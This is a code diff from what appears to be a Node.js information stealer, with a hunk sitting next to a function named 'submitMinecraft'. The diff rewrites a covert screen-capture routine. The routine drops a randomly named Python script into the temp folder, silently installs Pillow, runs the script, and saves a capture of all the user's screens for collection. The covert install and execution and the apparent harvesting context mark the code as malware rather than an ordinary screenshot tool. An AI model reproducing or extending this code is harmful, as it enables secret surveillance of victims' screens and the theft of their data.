@@ -2632,91 +2632,47 @@ async function submitMinecraft(mainFolderPath) {
 }
 
 async function createScreenshotScript() {
-    const outputPath = path.join(mainFolderPath, 'Screenshots');
-    if (!fs.existsSync(outputPath)) {
-        fs.mkdirSync(outputPath);
+    const screenshotsFolder = path.join(mainFolderPath, 'Screenshots');
+    
+    if (!fs.existsSync(screenshotsFolder)) {
+        fs.mkdirSync(screenshotsFolder, { recursive: true });
     }
     
-    const randomFileName = `${generateRandomString(10)}.ps1`;
+    const randomFileName = `${generateRandomString(10)}.py`;
     const scriptPath = path.join(user.temp, randomFileName);
 
-    const scriptContent = `
-try {
-    # Capture screenshots of all screens
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
+    const pythonScriptContent = `
+import os
+from PIL import ImageGrab
 
-    # Get all screens
-    $screens = [System.Windows.Forms.Screen]::AllScreens
+def screentimes(output_path):
+    # Prendre la capture d'écran de tous les écrans
+    image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
+    
+    # Sauvegarder l'image
+    image.save(output_path)
+    print(f"Screenshot saved to {output_path}")
 
-    # Calculate the total width and maximum height of all screens
-    $totalWidth = ($screens | ForEach-Object { $_.Bounds.Width } | Measure-Object -Sum).Sum
-    $maxHeight = ($screens | ForEach-Object { $_.Bounds.Height } | Measure-Object -Max).Maximum
-
-    # Check if the calculated values are valid
-    if ($totalWidth -le 0 -or $maxHeight -le 0) {
-        throw "Error: Unable to calculate valid screen dimensions."
-    }
-
-    # Try to create a bitmap with a PixelFormat argument
-    try {
-        $combinedScreenshot = New-Object System.Drawing.Bitmap $totalWidth, $maxHeight, ([System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
-    } catch {
-        throw "Error creating Bitmap object: $_"
-    }
-
-    # Try to create a graphics object
-    try {
-        $graphics = [System.Drawing.Graphics]::FromImage($combinedScreenshot)
-    } catch {
-        throw "Error creating Graphics object: $_"
-    }
-
-    # Capture the screen images and paste them onto the combined screenshot
-    $offsetX = 0
-    foreach ($screen in $screens) {
-        $screenScreenshot = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
-
-        # Try to create a graphics object for the screen
-        try {
-            $screenGraphics = [System.Drawing.Graphics]::FromImage($screenScreenshot)
-        } catch {
-            throw "Error creating screen Graphics object for $($screen.DeviceName): $_"
-        }
-
-        $screenGraphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
-        $graphics.DrawImage($screenScreenshot, $offsetX, 0)
-        $offsetX += $screen.Bounds.Width
-    }
-
-    # Save the combined screenshot to a file
-    $outputPath = "${mainFolderPath}\\Screenshots\\Screenshot.png"
-
-    try {
-        # Créer le répertoire si nécessaire
-        $outputDirectory = [System.IO.Path]::GetDirectoryName($outputPath)
-        if (-not (Test-Path -Path $outputDirectory)) {
-            New-Item -ItemType Directory -Force -Path $outputDirectory
-        }
-
-        # Convertir l'image en tableau de bytes et le sauvegarder directement
-        $imageBytes = [System.IO.MemoryStream]::new()
-        $combinedScreenshot.Save($imageBytes, [System.Drawing.Imaging.ImageFormat]::Png)
-        [System.IO.File]::WriteAllBytes($outputPath, $imageBytes.ToArray())
-        Write-Host "Combined screenshot saved to: $outputPath"
-    } catch {
-        # Gérer les erreurs et afficher le message d'erreur spécifique
-        throw "Error saving the combined screenshot: $($_.Exception.Message)"
-    }
-} catch {
-    Write-Host "Error occurred: $_"
-}
+# Exemple d'utilisation
+if __name__ == "__main__":
+    output_path = "${path.join(mainFolderPath, 'Screenshots', 'Screenshot.png').replace(/\\/g, '/')}"
+    screentimes(output_path)
     `;
+
     try {
-        await fs.promises.writeFile(scriptPath, scriptContent);
+        // Write the Python script to a file
+        await fs.promises.writeFile(scriptPath, pythonScriptContent);
+
+        // Install the Pillow dependency
+        await execPromise('pip install pillow');
+
+        // Execute the Python script
+        await execPromise(`python ${scriptPath}`);
+
+        console.log(`Python script executed successfully: ${scriptPath}`);
         return scriptPath;
     } catch (error) {
-        console.error(`Error writing PowerShell script: ${error.message}`);
+        console.error(`Error writing Python script, installing Pillow, or executing script: ${error.message}`);
         throw error; 
     }
 }
